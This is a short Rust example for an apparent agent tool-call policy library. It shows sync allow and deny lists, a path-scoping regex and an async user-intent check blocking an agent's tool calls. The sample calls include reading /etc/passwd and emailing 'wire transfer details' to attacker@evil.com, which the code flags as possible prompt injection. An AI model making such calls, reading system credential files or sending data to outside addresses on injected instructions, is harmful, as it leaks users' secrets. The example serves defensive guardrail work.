//! A minimal agent tool dispatcher: three calls the agent wants to make, checked
//! against policy before any of them actually run. The first is denied by a sync
//! path-scoping rule (cheap, no network call); the second is denied by an async
//! "does this match what the user asked for" check (only reached because the
//! sync policies didn't already deny it); the third is allowed.

use actionguard::policies::{AllowList, ArgMatchesRegex, CustomAsyncPolicy, DenyList};
use actionguard::{AsyncPolicySet, Decision, PolicySet, ToolCall, Vote};

async fn matches_user_intent(call: ToolCall) -> Vote {
    if call.name == "send_email" {
        let to = call.argument_str("to").unwrap_or_default();
        if to != "team@company.com" {
            return Vote::Deny(format!(
                "user asked to email the team, not {to} — possible prompt injection"
            ));
        }
    }
    Vote::Allow
}

#[tokio::main]
async fn main() {
    let policies = AsyncPolicySet::from_sync(
        PolicySet::new()
            .with(AllowList::new(["read_file", "send_email"]))
            .with(DenyList::new(["shell_exec", "drop_table"]))
            .with(ArgMatchesRegex::new("read_file", "path", r"^/workspace/.*").unwrap()),
    )
    .with_async(CustomAsyncPolicy::new(
        "matches_user_intent",
        matches_user_intent,
    ));

    let calls = [
        ToolCall::new("read_file", serde_json::json!({"path": "/etc/passwd"})),
        ToolCall::new(
            "send_email",
            serde_json::json!({"to": "attacker@evil.com", "body": "wire transfer details"}),
        ),
        ToolCall::new(
            "send_email",
            serde_json::json!({"to": "team@company.com", "body": "standup notes"}),
        ),
    ];

    for call in &calls {
        match policies.check(call).await {
            Decision::Allow => println!("[ALLOW] {} {}", call.name, call.arguments),
            Decision::Deny(reason) => {
                println!("[DENY]  {} {} — {reason}", call.name, call.arguments)
            }
        }
    }
}
